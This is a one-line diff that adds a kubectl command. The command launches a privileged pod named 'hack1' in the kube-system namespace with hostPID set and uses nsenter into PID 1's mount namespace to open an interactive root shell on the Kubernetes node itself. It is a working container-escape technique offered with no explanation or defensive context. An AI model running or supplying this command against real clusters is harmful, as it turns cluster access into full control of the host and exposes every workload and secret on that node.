@@ -1,0 +1,1 @@
+kubectl run hack1 --restart=Never -t -i -n kube-system --image overridden --overrides '{"spec":{"hostPID": true, "containers":[{"name":"busybox","image":"alpine:3.7","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}' --rm --attach
